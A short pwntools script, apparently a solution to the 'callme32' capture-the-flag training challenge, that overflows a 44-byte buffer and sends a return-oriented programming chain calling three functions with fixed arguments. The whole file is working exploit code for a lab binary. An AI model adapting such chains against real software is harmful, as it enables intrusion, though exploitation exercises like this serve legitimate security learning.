#!/usr/bin/env python2.7
from pwn import *
import os
# binary
challenge="callme32"
# payload chunks
padding="A"*44
callme_one=p32(0x080485c0)
callme_two=p32(0x08048620)
callme_three=p32(0x080485b0)
args=p32(1)+p32(2)+p32(3)
gadget=p32(0x80488a9)
# ROP chain
chain=padding+\
	callme_one+gadget+args+\
	callme_two+gadget+args+\
	callme_three+gadget+args
# open and execute the binary. feed it with the rop chain
binary=ELF(os.getcwd()+"/"+challenge)
proc=binary.process()
proc.sendline(chain)
print(proc.recv())